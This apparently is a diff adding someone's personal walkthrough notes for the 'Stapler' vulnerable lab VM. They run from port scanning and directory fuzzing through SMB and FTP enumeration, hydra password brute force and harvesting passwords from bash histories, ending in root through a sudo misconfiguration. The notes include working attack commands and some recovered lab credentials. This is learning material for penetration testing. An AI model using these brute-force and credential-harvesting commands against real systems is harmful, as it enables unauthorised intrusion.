@@ -1,0 +1,108 @@
+Stapler
+Open ports 
+PORT     STATE  SERVICE
+20/tcp   closed ftp-data
+21/tcp   open   ftp
+22/tcp   open   ssh
+53/tcp   open   domain
+80/tcp   open   http
+139/tcp  open   netbios-ssn
+666/tcp  open   doom
+3306/tcp open   mysql
+
+dirb http://192.168.56.121
+two files found
+downloaded and checked but useless
+
+Checked on port 666 
+found some encoded data 
+in starting I saw "PK" So i searched and found this is zip format
+
+ wget http://192.168.56.121:666/
+ mv index.html 666.zip
+ unzip 666.zip
+Found image having username
+ Find username, scott
+ 
+ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -t 100 -u http://192.168.56.121/FUZZ
+ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -t 100 -u http://192.168.56.121:666/FUZZ
+
+
+I found anonymous login allowed
+login and found a file note , after checking file i found 2 users
+elly and john
+bruteforce attack against elly using -e nsr option with hydra command
+username elly password ylle
+
+enum4linux 192.168.56.121 > enum4linux
+sed -n 's/.*Unix User\\\(.*\) (Local User)/\1/p' enum4linux >s_user.txt
+
+smbclient -N //192.168.56.121/kathy
+downloaded 3 files todo-list.txt, wordpress, vsftpd.conf
+
+open todo-list.txt find 2 more users
+initech, kathy
+cat vsftpd.conf (no senstive information)
+All checked worpdress but no luck
+smbclient -N //192.168.56.121/tmp 
+dir
+
+
+get ls
+cat ls
+find directory name systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
+try to access but not found
+brute force against ftp username elly
+got password 
+login and download passwd file 
+
+cat passwd | grep '/bin/bash' | cut -d ":" -f 1 >>sshusers
+
+
+Brute force against ssh
+
+hydra -L sshusers -P /usr/share/wordlists/rockyou.txt -e nsr 192.168.56.121 ssh -t 4 -u
+
+
+
+
+Brute force against ssh
+hydra -L s_user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.121 ssh -t 4 -I
+hydra -L s_user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.121 ssh -t 4 -u
+
+got username and password 
+username:SHayslett
+password:SHayslett
+
+user lenpeas for enumeration.
+found peter is a sudo 
+
+Lots of home directory start checking all directory found juicy information inside JKanode
+
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+
+Enumerate directory fast 
+find /home -name .bash_history -exec cat {} \;
+
+I found perter and its password so logged in 
+su peter
+sudo -l
+(sudo missconfiguration )
+sudo su
+got root access
+
+
+
+ 
+
